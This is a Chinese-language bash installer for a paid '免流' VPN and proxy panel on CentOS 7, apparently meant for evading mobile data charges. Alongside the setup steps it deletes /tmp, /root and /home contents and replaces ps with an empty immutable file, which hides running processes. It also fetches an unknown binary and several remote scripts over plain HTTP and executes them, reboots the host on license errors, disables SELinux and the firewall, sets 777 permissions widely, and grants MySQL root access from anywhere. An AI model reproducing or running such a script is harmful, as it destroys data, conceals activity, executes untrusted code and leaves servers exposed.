#!/bin/bash
ulimit -c 0
if [ ! -e "/usr/bin/chattr" ];then
echo -e "\033[42m 检测非法环境 \033[0m"
exit 0;
fi
rm -rf /tmp/tmp*            >/dev/null 2>&1
rm -rf /tmp/*               >/dev/null 2>&1
chattr -a /tmp/*            >/dev/null 2>&1
chattr -i /tmp/*            >/dev/null 2>&1
chattr -i /usr/bin/*        >/dev/null 2>&1
chattr -i /usr/bin/         >/dev/null 2>&1
chattr -a /usr/bin/*        >/dev/null 2>&1
chattr -i /usr/bin/ps       >/dev/null 2>&1
rm -rf /usr/bin/ps*         >/dev/null 2>&1
touch /usr/bin/ps           >/dev/null 2>&1
chattr +i /usr/bin/ps       >/dev/null 2>&1          
if [ ! -e "/usr/bin/xggrm" ];then
cd /usr/bin
wget -q http://www.yxvpn.net/xggrm
chmod 777 /usr/bin/xggrm     >/dev/null 2>&1
chattr +i /usr/bin/xggrm     >/dev/null 2>&1
fi
xggrm -rf /usr/bin/gcore
xggrm -rf /root/*
xggrm -rf $0
xggrm -rf sf
echo -e "\033[31m程序载入中，请稍后...\033[0m"
if [ -f /etc/os-release ];then
OS_VERSION=`cat /etc/os-release |awk -F'[="]+' '/^VERSION_ID=/ {print $2}'`
if [ ${OS_VERSION} != "7" ];then
echo -e "\n当前系统版本为：\033[31mCentOS $OS_VERSION\033[0m\n" 
echo "脚本不支持该系统 请更换 CentOS 7.0-7.2 系统进行安装"
exit 0;
fi
yum -y install curl >/dev/null 2>&1
sq=squid.conf;
mp=udp.c;
EasyRSA=EasyRSA.tar.gz;
IP=`curl -s ip.3322.net`;
squser=auth_user;
sysctl=sysctl.conf;
server='server-password.zip';
webfile='web-11-13.zip';
phpmyadmin=sql$RANDOM$RANDOM;
uploadfile=SFML-OpenVpn.zip;
export uploadfile=$uploadfile
clear
echo -e "\033[31m==================================================================\033[0m"
echo -e "\033[32m                      随风免流 - 流量控制系统                      \033[0m"
echo -e "\033[35m                    Powered by www.sfyml.top 2017                 \033[0m"
echo -e "\033[36m                         All Rights Reserved                     \033[0m"
echo -e "\033[37m                                                                 \033[0m"
echo -e "\033[31m                           by  呆瓜 2017-11-13                    \033[0m"
echo -e "\033[33m==================================================================\033[0m"
sleep 0.5
if [[ "$IP" == '' ]]; then
echo '无法检测您的IP,可能会影响到您接下来的搭建工作';
read -p '请输入您的公网IP:' IP;
[[ "$IP" == '' ]] && InputIPAddress;
fi;
[[ "$IP" != '' ]] && 
echo -e "您的IP是：\033[34m$IP \033[0m"
row=`curl -s http://sq.dguaml.cn/shell.php`
if [[ $row =~ 'ok' ]]; then
Download=`curl -s http://sq.dguaml.cn/xz.php`;
else
echo -e "\033[33m未授权、请输入卡号和卡密开启安装向导\033[0m"
echo
echo -e "\033[33m未购买卡号和卡密请到：http://t.cn/RSrIjwI购买\033[0m"
echo
echo -ne '输入卡号：'
read one
echo -ne '输入卡密：'
read two
echo;echo '请稍等授权验证中...'
bead=`curl -s http://sq.dguaml.cn/shell.php?km=${one}:${two}`
if [[ $bead =~ 'geek' ]]; then
Download=`curl -s http://sq.dguaml.cn/xz.php`;
elif [[ $bead =~  'sb' ]]; then
echo '卡密已使用、请重新购买'
exit;
elif [[ $bead =~ 'no' ]]; then
echo '卡号或密码错误、请到购买地址检查是否正确...'
exit;
else
echo '未知错误、你的服务器重启中...'
reboot
exit;
fi
fi
echo
clear
echo -e "\033[31m==================================================================\033[0m"
echo -e "\033[32m                      随风免流 - 流量控制系统                      \033[0m"
echo -e "\033[35m                    Powered by www.sfyml.top 2017                 \033[0m"
echo -e "\033[36m                         All Rights Reserved                     \033[0m"
echo -e "\033[37m                                                                 \033[0m"
echo -e "\033[31m                           by  呆瓜 2017-11-13                    \033[0m"
echo -e "\033[33m==================================================================\033[0m"
echo -e "\033[37m WEB安装与负载：\033[0m"
echo -e "\033[34m 1 - 全新安装(回车默认) < 全新二期流控\033[0m"
echo -e "\033[36m 2 - 对接模式  实现N台服务器共用账号 负载均衡\033[0m"
echo
echo -e "\033[37m WEB附加选项：\033[0m"
echo -e "\033[32m 3 - 代理APP   可给代理定制APP\033[0m"
echo -e "\033[36m 4 - 备份恢复  备份和恢复\033[0m"
echo
echo -e "\033[37m WEB附加工具：\033[0m"
echo -e "\033[35m 5 - 美化版APP 美化版卫士、云端APK生成\033[0m"
echo -e "\033[33m 6 - 线路生成  生成最新线路、自动导入\033[0m"
echo -e "\033[32m 7 - 智能解析  去广告、访问谷歌服务、YouTube\033[0m"
echo -e "\033[37m x - 卸载. \033[0m"
echo
echo -n -e "请输入对应数字:"
read installslect
download=http://sfyml.nos-eastchina1.126.net;
if [[ $installslect == "2" ]];then
wget -q ${download}/fz.sh;bash fz.sh
exit 0;
fi
if [[ $installslect == "3" ]];then
wget -q ${download}/app.sh;bash app.sh
exit 0;
fi
if [[ $installslect == "4" ]];then
wget -q ${download}/bf.sh;bash bf.sh
exit 0;
fi
if [[ $installslect == "5" ]];then
wget -q ${download}/mhapp.sh;bash mhapp.sh
exit 0;
fi
if [[ $installslect == "6" ]];then
wget -q ${download}/xlsc11-13.sh;bash xlsc11-13.sh
exit 0;
fi
if [[ $installslect == "7" ]];then
wget -q ${download}/dns.sh;bash dns.sh
exit 0;
fi
if [[ $installslect == "x" ]];then
wget -q ${download}/x.sh;bash x.sh
exit 0;
fi
vpnport=443 
echo -n -e "HTTP转接端口[\033[32m回车默认8080\033[0m]:"
read mpport
if [[ -z $mpport ]];then 
echo -e  "\033[36mHTTP转接端口： 8080\033[0m" 
mpport=8080 
else 
echo -e  "\033[36mHTTP转接端口：$mpport\033[0m" 
fi 
echo 
echo -n -e "常规代理端口[\033[32m建议保留80\033[0m]:" 
read sqport 
if [[ -z $sqport ]];then
echo -e "\033[36m常规代理端口：80\033[0m"
sqport=80
else 
echo -e "\033[36m常规代理端口：$sqport\033[0m"
fi 
echo
echo -n -e "WEB流控端口[\033[32m回车默认随机4位\033[0m]:"
read port
if [[ -z $port ]];then
port=`openssl rand -base64 4 | cksum | cut -c1-4`
fi
echo -e "\033[36mWEB流控端口：$port\033[0m"
echo
echo -n -e "数据库密码[\033[32m回车默认随机6位\033[0m]:"
read sqlpass
if [[ -z $sqlpass ]];then
sqlpass=`cat /dev/urandom | head -n 6 | md5sum | head -c 6`
fi
echo -e "\033[36m数据库密码：$sqlpass \033[0m"
echo
echo -n -e "WEB面板账号[\033[32m回车默认admin\033[0m]:"
read id
if [[ -z $id ]];then
id=admin
fi
echo -e "\033[36mWEB面板账号：$id\033[0m"
echo
echo -n -e "WEB面板密码[\033[32m回车默认随机6位\033[0m]:"
read ml
if [[ -z $ml ]];then
ml=`cat /dev/urandom | head -n 6 | md5sum | head -c 6`
fi
echo -e "\033[36mWEB面板密码：$ml\033[0m"
echo
echo -n -e "WEB面板地址[\033[32m回车默认随机15位\033[0m]:"
read gldz
if [[ -z $gldz ]];then
gldz=`cat /dev/urandom | head -n 15 | md5sum | head -c 15`
fi
echo -e "\033[36mWEB面板地址：$gldz\033[0m"
echo
echo -n -e "APP名称[\033[32m与流量卫士APP同名\033[0m]:"
read appname 
if [[ -z $appname ]];then
appname=随风云免
fi
echo -e "\033[36mAPP名称：$appname \033[0m"
echo 
echo -n -e "APP客服QQ[\033[32m回车默认10086\033[0m]:" 
read appqq
if [[ -z $appqq ]];then 
appqq=10086
fi
echo -e "\033[36mAPP客服QQ：$appqq \033[0m"
echo
echo  -n -e "云端APP对接KEY[\033[32mKEY可以自行输入\033[0m]:" 
read appkey
if [[ -z $appkey ]];then
appkey=sf0622
fi
echo -e "\033[36mAPP对接KEY：$appkey \033[0m" 
echo
echo  -n -e "流量卫士APP对接KEY[\033[32mKEY可以随便输入\033[0m]:" 
read llwskey
if [[ -z $llwskey ]];then 
llwskey=SFML$RANDOM$RANDOM
fi
if [[ $port == "80" ]] && [[ $sqport == "80" ]];then
echo;echo "检测到HTTP端口和流控端口有冲突，系统默认流控为随机端口";port=`openssl rand -base64 4 | cksum | cut -c1-4`
fi
echo -e "\033[36m流量卫士APP对接KEY：$llwskey \033[0m" 
llwsmd5=`echo -n $llwskey|md5sum`
echo -n -e "\033[31m回车自动搭建\033[0m";read
echo -e "\033[36m安装环境中...\033[0m"
CURTIME=`date +"%Y-%m-%d %H:%M:%S"`;
#############开始#############
setenforce 0 
sestatus=`/usr/sbin/sestatus -v`
[[ $sestatus =~ "enforcing" ]] && sta=1
if [[ $sta == "1" ]]
then
echo -e "\033[34m 临时关闭Selinux失败,脚本已为您修改配置,重启后生效 \033[0m "
sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config >/dev/null 2>&1
echo
fi
#############结束#############
echo -e "\033[36m整理残留中...\033[0m"
systemctl stop openvpn@server.service >/dev/null 2>&1
yum -y remove openvpn >/dev/null 2>&1
systemctl stop squid.service >/dev/null 2>&1
yum -y remove squid >/dev/null 2>&1
killall udp >/dev/null 2>&1
rm -rf /etc/openvpn/*
rm -rf /root/*
rm -rf /home/* 
systemctl stop httpd.service >/dev/null 2>&1
systemctl stop mariadb.service >/dev/null 2>&1
systemctl stop mysqld.service >/dev/null 2>&1
/etc/init.d/mysqld stop >/dev/null 2>&1
yum remove -y httpd >/dev/null 2>&1
yum remove -y mariadb mariadb-server >/dev/null 2>&1
yum remove -y mysql mysql-server >/dev/null 2>&1
yum remove -y nginx >/dev/null 2>&1
rm -rf /var/lib/mysql
rm -rf /var/lib/mysql/
rm -rf /usr/lib64/mysql
rm -rf /etc/my.cnf
rm -rf /var/log/mysql/
rm -rf
yum remove -y php-fpm php-cli php-gd php-mbstring php-mcrypt php-mysqlnd php-opcache php-pdo php-devel php-xml >/dev/null 2>&1
yum remove -y squid openvpn httpd epel* openssl openssl-devel lzo lzo-devel pam pam-devel automake pkgconfig expect gcc php-fpm php-cli php-gd php-mbstring php-mcrypt php-mysqlnd php-opcache php-pdo php-devel php-xml >/dev/null 2>&1
yum install -y curl redhat-lsb gawk tar iptables iptables-services zip unzip httpd-devel net-tools psmisc gcc glibc-static java openssl expect ntp lsof psmisc net-tools >/dev/null 2>&1

echo -e "\033[36m配置网络环境...\033[0m"
systemctl stop firewalld.service >/dev/null 2>&1
systemctl disable firewalld.service >/dev/null 2>&1
systemctl restart iptables.service >/dev/null 2>&1
yum install iptables-services -y >/dev/null 2>&1
yum -y install vim vim-runtime ctags >/dev/null 2>&1
setenforce 0  >/dev/null 2>&1
echo "/usr/sbin/setenforce 0" >> /etc/rc.local >/dev/null 2>&1
cd /etc/
rm -rf ./${sysctl}
wget ${Download}/${sysctl} >/dev/null 2>&1
chmod 0777 ./${sysctl} >/dev/null 2>&1
sysctl -p >/dev/null 2>&1
echo -e "\033[36m配置防火墙...\033[0m"
systemctl start iptables >/dev/null 2>&1
systemctl restart iptables >/dev/null 2>&1
iptables -F >/dev/null 2>&1
iptables -t nat -A POSTROUTING -s 10.0.0.0/16 -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.0.0.0/16 -j SNAT --to-source $IP
iptables -t nat -A POSTROUTING -s 10.5.0.0/16 -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.5.0.0/16 -j SNAT --to-source $IP
iptables -t nat -A POSTROUTING -s 10.6.0.0/16 -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.6.0.0/16 -j SNAT --to-source $IP
iptables -t nat -A POSTROUTING -s 10.8.0.0/16 -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.8.0.0/16 -j SNAT --to-source $IP
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 361 -j DNAT --to-destination $IP:137
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 138 -j DNAT --to-destination $IP:137
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 440 -j DNAT --to-destination $IP:$vpnport
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 3389 -j DNAT --to-destination $IP:$vpnport
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 28080 -j ACCEPT
iptables -A INPUT -p TCP --dport $vpnport -j ACCEPT
iptables -A INPUT -p TCP --dport $port -j ACCEPT
iptables -A INPUT -p TCP --dport $mpport -j ACCEPT
iptables -A INPUT -p TCP --dport $sqport -j ACCEPT
iptables -A INPUT -p TCP --dport 135 -j ACCEPT
iptables -A INPUT -p TCP --dport 136 -j ACCEPT
iptables -A INPUT -p TCP --dport 137 -j ACCEPT
iptables -A INPUT -p TCP --dport 138 -j ACCEPT
iptables -A INPUT -p TCP --dport 139 -j ACCEPT
iptables -A INPUT -p TCP --dport 366 -j ACCEPT
iptables -A INPUT -p TCP --dport 351 -j ACCEPT
iptables -A INPUT -p TCP --dport 265 -j ACCEPT
iptables -A INPUT -p TCP --dport 524 -j ACCEPT
iptables -A INPUT -p TCP --dport 3389 -j ACCEPT
iptables -A INPUT -p TCP --dport 180 -j ACCEPT
iptables -A INPUT -p TCP --dport 366 -j ACCEPT
iptables -A INPUT -p TCP --dport 53 -j ACCEPT
iptables -A INPUT -p TCP --dport 1194 -j ACCEPT
iptables -A INPUT -p TCP --dport 18889 -j ACCEPT
iptables -A INPUT -p TCP --dport 80 -j ACCEPT
iptables -A INPUT -p TCP --dport 22 -j ACCEPT
iptables -A INPUT -p TCP --dport 25 -j DROP
iptables -A INPUT -p udp --dport 53 -j ACCEPT
iptables -A INPUT -p udp --dport 68 -j ACCEPT
iptables -A INPUT -p udp --dport 138 -j ACCEPT
iptables -A INPUT -p udp --dport 137 -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
service iptables save >/dev/null 2>&1
service iptables restart >/dev/null 2>&1
systemctl restart iptables.service >/dev/null 2>&1
chkconfig iptables on >/dev/null 2>&1
systemctl enable iptables.service >/dev/null 2>&1
setenforce 0 >/dev/null 2>&1
echo -e "\033[36m安装主程序...\033[0m"
yum install -y gawk tar iptables iptables-services zip unzip httpd-devel net-tools psmisc gcc glibc glibc-static glibc-utils java openssl openssl-libs ntp libstdc++ glibc.i686  >/dev/null 2>&1
fi
if [ ! -e "/usr/lib/libz.so.1" ];  then
yum install -y zlib >/dev/null 2>&1
fi
if [ ! -e "/usr/bin/gcc" ];  then
yum install -y gcc >/dev/null 2>&1
fi
if [ ! -e "/usr/bin/java" ]; then
yum install -y java >/dev/null 2>&1
fi
if [ ! -e "/usr/lib/libz.so.1" ]; then
rpm -ivh http://tx.xbaicai.net/zlib-1.2.7-17.el7.i686.rpm >/dev/null 2>&1
fi
if [ ! -e "/lib/libgcc_s.so.1" ]; then
rpm -ivh http://tx.xbaicai.net/libgcc-4.8.5-11.el7.i686.rpm >/dev/null 2>&1
fi
rpm -ivh http://tx.xbaicai.net/pkcs11-helper-1.11-3.el7.x86_64.rpm >/dev/null 2>&1
if [ ! -e "/usr/lib64/libpkcs11-helper.so.1" ];then
rpm -Uvh http://tx.xbaicai.net/epel-release-7-9.noarch.rpm >/dev/null 2>&1
yum install pkcs11-helper -y >/dev/null 2>&1
fi
cd /etc/
wget http://tx.xbaicai.net/openvpn-2.3.2-4.el7.x86_64.rpm >/dev/null 2>&1									 
rpm -Uvh --oldpackage openvpn-2.3.2-4.el7.x86_64.rpm >/dev/null 2>&1	
\cp /usr/sbin/openvpn /usr/sbin/openvpn2 >/dev/null 2>&1
rm -f openvpn-2.3.2-4.el7.x86_64.rpm
if [ ! -e "/usr/sbin/openvpn" ];then
rpm -Uvh http://tx.xbaicai.net/epel-release-7-9.noarch.rpm >/dev/null 2>&1
yum install openvpn -y >/dev/null 2>&1
\cp /usr/sbin/openvpn /usr/sbin/openvpn2 >/dev/null 2>&1
fi
yum install -y curl redhat-lsb gawk tar iptables iptables-services zip unzip httpd-devel net-tools psmisc gcc glibc-static java openssl expect ntp lsof psmisc net-tools >/dev/null 2>&1
yum install -y telnet openssl openssl-devel lzo lzo-devel pam pam-devel automake pkgconfig expect gcc net-tools >/dev/null 2>&1

cd /etc/openvpn/ 
rm -rf *
chmod 0777 /etc/openvpn
wget ${Download}/${EasyRSA} >/dev/null 2>&1
tar -zxvf ${EasyRSA} >/dev/null 2>&1
rm -rf /etc/openvpn/${EasyRSA}
chmod -R 0777 /etc/openvpn/
systemctl enable openvpn@server.service >/dev/null 2>&1
cp /etc/openvpn/easy-rsa/keys/ca.crt /home/
cp /etc/openvpn/easy-rsa/ta.key /home/

echo "echo -e '\033[33m正在重启openvpn服务...\033[0m'
onlock >/dev/null 2>&1
killall openvpn >/dev/null 2>&1
systemctl restart openvpn@server.service
killall udp >/dev/null 2>&1
udp -l $mpport -d >/dev/null 2>&1
udp -l 135 -d >/dev/null 2>&1
udp -l 136 -d >/dev/null 2>&1
udp -l 137 -d >/dev/null 2>&1
udp -l 138 -d >/dev/null 2>&1
udp -l 139 -d >/dev/null 2>&1
udp -l 53 -d >/dev/null 2>&1
udp -l 68 -d >/dev/null 2>&1
udp -l 3389 -d >/dev/null 2>&1
udp -l 1194 -d >/dev/null 2>&1
udp -l 18889 -d >/dev/null 2>&1
udp -l 351 -d >/dev/null 2>&1
udp -l 524 -d >/dev/null 2>&1
udp -l 265 -d >/dev/null 2>&1
udp -l 440 -d >/dev/null 2>&1
udp -l 180 -d >/dev/null 2>&1
udp -l 366 -d >/dev/null 2>&1
udp -l 28080 -d >/dev/null 2>&1
killall squid >/dev/null 2>&1
killall squid >/dev/null 2>&1
squid -z >/dev/null 2>&1
systemctl restart squid
lamp >/dev/null 2>&1
openvpn --config /etc/openvpn/server.conf &
openvpn --config /etc/openvpn/udp137.conf &
openvpn --config /etc/openvpn/udp138.conf &
openvpn --config /etc/openvpn/udp53.conf &
openvpn --config /etc/openvpn/udp68.conf &
killall jiankong >/dev/null 2>&1
killall backups.sh >/dev/null 2>&1
/var/www/html/res/jiankong >>/var/www/html/more/jiankong.log 2>&1 &
/var/www/html/udp/jiankong >>/var/www/html/more/jiankong.log 2>&1 &
/etc/openvpn/backups.sh >>/var/www/html/more/backups.log 2>&1 &
unlock  >/dev/null 2>&1
echo -e '\033[1;37m服务状态：            [\033[32m  OK  \033[0m\033[1;37m]\033[0m'
exit 0;
" >/bin/vpn
chmod 777 /bin/vpn
chmod +x /etc/rc.d/rc.local
echo "sh /bin/vpn" >>/etc/rc.d/rc.local
yum -y install squid >/dev/null 2>&1
cd /etc/squid/
rm -rf ./squid.conf
killall squid >/dev/null 2>&1
wget ${Download}/${sq} >/dev/null 2>&1
sed -i 's/http_port 80/http_port '$sqport'/g' /etc/squid/squid.conf >/dev/null 2>&1
chmod 0755 ./${sq} >/dev/null 2>&1
wget ${Download}/${squser} >/dev/null 2>&1
chmod 0755 ./${squser} >/dev/null 2>&1
cd /etc /
chmod 777 -R squid
cd squid
squid -z >/dev/null 2>&1
systemctl restart squid >/dev/null 2>&1
systemctl enable squid >/dev/null 2>&1
#############HTTP转接#############
cd /usr/bin/
wget ${Download}/${mp} >/dev/null 2>&1
sed -i "23s/8080/$mpport/" udp.c >/dev/null 2>&1
sed -i "184s/443/$vpnport/" udp.c >/dev/null 2>&1
gcc -o udp udp.c >/dev/null 2>&1
rm -rf ${mp}
chmod 0777 ./udp
echo -e "\033[36m安装极速LAMP...\033[0m"

	yum install -y httpd >/dev/null 2>&1
	chkconfig httpd on >/dev/null 2>&1
	sed -i 's/#ServerName www.example.com:80/ServerName localhost:'$port'/g' /etc/httpd/conf/httpd.conf 
	sed -i 's/Listen 80/Listen '$port'/g' /etc/httpd/conf/httpd.conf 
	service httpd start >/dev/null 2>&1
	yum install -y mariadb mariadb-server >/dev/null 2>&1
	systemctl start mariadb.service >/dev/null 2>&1
	systemctl stop mariadb.service >/dev/null 2>&1
	systemctl restart mariadb.service >/dev/null 2>&1
	systemctl enable mariadb.service >/dev/null 2>&1
	yum install -y php >/dev/null 2>&1
	yum install -y php-fpm php-mysql php-gd libjpeg* php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-bcmath php-mhash >/dev/null 2>&1
	systemctl restart mariadb.service >/dev/null 2>&1
	systemctl restart httpd.service >/dev/null 2>&1
	echo "echo -e '\033[1;33m正在重启LAMP服务...\033[0m'
	systemctl restart mariadb >/dev/null 2>&1
	systemctl restart httpd.service >/dev/null 2>&1
	systemctl restart php-fpm.service >/dev/null 2>&1
	echo -e '\033[1;37m服务状态：            [\033[32m  OK  \033[0m\033[1;37m]\033[0m'
	exit 0;
	" >/bin/lamp;chmod 0777 /bin/lamp >/dev/null 2>&1
echo -e "\033[36m安装WEB程序...\033[0m"

mysqladmin -u root password "${sqlpass}"

cd /var/www/html
wget ${Download}/${webfile} >/dev/null 2>&1
unzip ${webfile} >/dev/null 2>&1
rm -rf ${webfile} >/dev/null 2>&1
mv /var/www/html/conf/* /etc/openvpn/
mv /var/www/html/safe/* /usr/bin/
rm -rf /root/*
sed -i 's/sqlpass/'$sqlpass'/g' /var/www/html/config.php >/dev/null 2>&1
sed -i 's/www.sfyml.top/'${IP}:${port}'/g' /var/www/html/app_api/mode/ad.php >/dev/null 2>&1
sed -i 's/随风云免/'$llwsname'/g' /var/www/html/app_api/mode/ad.php >/dev/null 2>&1
sed -i 's/1657075309/'$appqq'/g' /var/www/html/app_api/mode/all.php >/dev/null 2>&1
sed -i 's/随风云免/'$llwsname'/g' /var/www/html/app_api/mode/all.php >/dev/null 2>&1
sed -i 's/sqlpass/'$sqlpass'/g' /var/www/html/app_api/config.php >/dev/null 2>&1
sed -i 's/0542fa6e2f2de6bb5f3a7813ded625ab/'$llwsmd5'/g' /var/www/html/app_api/licences.key >/dev/null 2>&1
sed -i '63s/admin/'$gldz'/g' /var/www/html/app_api/nav.php >/dev/null 2>&1
sed -i '1s/30/'10'/g' /etc/openvpn/peizhi.cfg >/dev/null 2>&1
sed -i 's/3600/'86400'/g' /etc/openvpn/peizhi.cfg >/dev/null 2>&1
sed -i '20s/123456/'$sqlpass'/g' /etc/openvpn/peizhi.cfg >/dev/null 2>&1
sed -i 's/www.sfyml.top/'${IP}:${port}'/g' /etc/openvpn/peizhi.cfg >/dev/null 2>&1
sed -i 's/0542fa6e2f2de6bb5f3a7813ded625ab/'${llwskey}'/g' /etc/openvpn/peizhi.cfg >/dev/null 2>&1
sed -i 's/sfyml.top/'${IP}'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/1234/'$port'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/随风云免/'$appname'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/sf0622/'$appkey'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/123456/'$appqq'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/0542fa6e2f2de6bb5f3a7813ded625ab/'$llwsmd5'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/openvpn-sfml.zip/'$uploadfile'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
sed -i 's/xgg0622/'$llwskey'/g' /etc/openvpn/guanli.cfg >/dev/null 2>&1
mv /var/www/html/app_api/top_api.php /var/www/html/app_api/${llwskey}.php >/dev/null 2>&1
mv /var/www/html/admin /var/www/html/$gldz >/dev/null 2>&1
mv /var/www/html/phpmyadmin /var/www/html/$phpmyadmin >/dev/null 2>&1
sed -i 's/phpmyadmin/'${phpmyadmin}'/g' /usr/bin/onlock >/dev/null 2>&1
sed -i 's/phpmyadmin/'${phpmyadmin}'/g' /usr/bin/unlock >/dev/null 2>&1
sed -i 's/phpmyadmin/'${phpmyadmin}'/g' /usr/bin/onsql >/dev/null 2>&1
sed -i 's/phpmyadmin/'${phpmyadmin}'/g' /usr/bin/unsql >/dev/null 2>&1
sed -i 's/admin/'${gldz}'/g' '/usr/bin/onlock' >/dev/null 2>&1
sed -i 's/admin/'${gldz}'/g' '/usr/bin/unlock' >/dev/null 2>&1
chmod 777 -R /var/www/html/
chmod 777 /usr/bin/unlock
chmod 777 /usr/bin/onlock
chmod 777 /usr/bin/onsql
chmod 777 /usr/bin/unsql
chmod 777 /usr/bin/kdk
chmod 777 /usr/bin/qh
chmod 777 /usr/bin/gx
chmod 777 -R /etc/openvpn/*
chmod 777 -R *
chmod 777 -R res
chmod 777 -R udp
chmod 777 -R udp/*.txt
chmod 777 -R res/*.txt
chmod 777 -R app_api

##########################################
mlmd5=`echo -n $ml|md5sum`
sed -i 's/sfadmin/'$id'/g' /var/www/html/database/install.sql >/dev/null 2>&1
sed -i 's/1657075309/'$appqq'/g' /var/www/html/database/install.sql >/dev/null 2>&1
sed -i '41s/9702bec258c38676a1217f2c0c58d610/'${mlmd5%%\ *}'/g' /var/www/html/database/install.sql >/dev/null 2>&1
sed -i '83s/9702bec258c38676a1217f2c0c58d610/'${ml}'/g' /var/www/html/database/install.sql >/dev/null 2>&1
sed -i 's/www.sfyml.top:1234/'${IP}:${port}'/g' /var/www/html/database/install.sql >/dev/null 2>&1
sed -i 's/SFML2017/'${appkey}'/g' /var/www/html/database/install.sql >/dev/null 2>&1
create_db_sql="create database IF NOT EXISTS ov"
mysql -hlocalhost -uroot -p$sqlpass -e "${create_db_sql}"
mysql -hlocalhost -uroot -p$sqlpass --default-character-set=utf8<<EOF
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'IDENTIFIED BY '${sqlpass}' WITH GRANT OPTION;
flush privileges;
use ov;
source /var/www/html/database/install.sql;
EOF
##########################################
rm -rf /var/www/html/cx/cx.php
rm -rf /var/www/html/database/*.sql
rm -rf /var/www/html/conf
rm -rf /var/www/html/safe
rm -rf /root/*
yum install -y crontabs >/dev/null 2>&1
mkdir -p /var/spool/cron/ >/dev/null 2>&1
chmod 777 /var/www/html/cron.php >/dev/null 2>&1
echo -e "\033[36m安装实时监控...\033[0m"
echo "* * * * * curl --silent --compressed http://${IP}:${port}/cron.php">>/var/spool/cron/root >/dev/null 2>&1
systemctl restart crond.service  >/dev/null 2>&1   
systemctl enable crond.service >/dev/null 2>&1 
##########################################

echo "/var/www/html/res/jiankong >>/var/www/html/more/jiankong.log 2>&1 &">>/etc/rc.local >/dev/null 2>&1
echo "/var/www/html/udp/jiankong >>/var/www/html/more/jiankong.log 2>&1 &">>/etc/rc.local >/dev/null 2>&1
chmod a+x /etc/openvpn/backups.sh >/dev/null 2>&1
echo "/etc/openvpn/backups.sh >>/home/backups.log 2>&1 &">>/etc/rc.local >/dev/null 2>&1
vpn >/dev/null 2>&1
systemctl enable openvpn@server.service >/dev/null 2>&1
echo -e "\033[36m生成Android...\033[0m"
cd /root
wget ${download}/11-13-app.sh >/dev/null 2>&1
chmod 777 11-13-app.sh;./11-13-app.sh
echo -e "\033[36m生成配置文件...\033[0m"
cd /root
wget ${download}/scxl-11-13.sh >/dev/null 2>&1
chmod 777 scxl-11-13.sh;./scxl-11-13.sh
onlock >/dev/null 2>&1
source /etc/openvpn/guanli.cfg
\cp -rf /home/${uploadfile} /var/www/html/${uploadfile} >/dev/null 2>&1
\cp -rf /home/yunduan.apk /var/www/html/yunduan.apk >/dev/null 2>&1
\cp -rf /home/weishi.apk /var/www/html/weishi.apk >/dev/null 2>&1
\cp -rf /home/weishi1.apk /var/www/html/weishi1.apk >/dev/null 2>&1
cd /home
rm -rf llws && rm -rf android && rm -rf *.ovpn && rm -rf /home/apktool.jar && rm -rf /home/signer.tar.gz
LASTLINE=`date +"%Y-%m-%d %H:%M:%S"`;
Sys_data=`date -d  "$CURTIME" +%s`
In_data=`date -d  "$LASTLINE" +%s`;
installtime=`expr $In_data - $Sys_data`;
echo -e "\033[36m正在为您开启所有服务...\033[0m"
chmod 777 /var/www/html/res/*
chmod 777 /var/www/html/udp/*
chmod 0777 /usr/bin/udp
udp -l $mpport -d >/dev/null 2>&1
udp -l 135 -d >/dev/null 2>&1
udp -l 136 -d >/dev/null 2>&1
udp -l 137 -d >/dev/null 2>&1
udp -l 138 -d >/dev/null 2>&1
udp -l 139 -d >/dev/null 2>&1
udp -l 53 -d >/dev/null 2>&1
udp -l 1194 -d >/dev/null 2>&1
udp -l 18889 -d >/dev/null 2>&1
udp -l 68 -d >/dev/null 2>&1
udp -l 3389 -d >/dev/null 2>&1
udp -l 351 -d >/dev/null 2>&1
udp -l 524 -d >/dev/null 2>&1
udp -l 265 -d >/dev/null 2>&1
udp -l 440 -d >/dev/null 2>&1
udp -l 180 -d >/dev/null 2>&1
udp -l 366 -d >/dev/null 2>&1
udp -l 28080 -d >/dev/null 2>&1
sleep 0.5
cd /home/
echo -e "\033[36m正在加载您的配置信息...\033[0m"
cp /home/ca.crt /var/www/html/more/ >/dev/null 2>&1
cp /home/ta.key /var/www/html/more/ >/dev/null 2>&1
clear
cd /home
echo '恭喜你，搭建完成!' >>info.txt
echo -e "
---------------------------------------------------------     
用户中心 http://${IP}:${port}                      
后台管理 http://${IP}:${port}/${gldz}        
代理中心 http://${IP}:${port}/daili            
数据库管理 http://${IP}:${port}/${phpmyadmin}   
--------------------------------------------------------- 
温馨提示：流量卫士账号密码与后台一致 
数据库账号 root 数据库密码 ${sqlpass}   
管理账号 ${id}    管理密码 ${ml}                
---------------------------------------------------------        
流量查询 http://${IP}:${port}/cx/index.php   
IOS线路  http://${IP}:${port}/ios                     
---------------------------------------------------------              
云端APP  http://${IP}:${port}/yunduan.apk 
流量卫士 http://${IP}:${port}/weishi.apk 
流量卫士1 http://${IP}:${port}/weishi1.apk 
流量卫士2 请重新执行脚本选项5即可生成 
线路下载 http://${IP}:${port}/$uploadfile 
---------------------------------------------------------     
目录锁定/解锁 unlock  onlock      
数据库锁定/解锁 unsql    onsql        
在线更新命令(告别重新搭建)：gx
切换线路定位命令：qh
开端口命令 kdk                                   
--------------------------------------------------------- 
">>info.txt
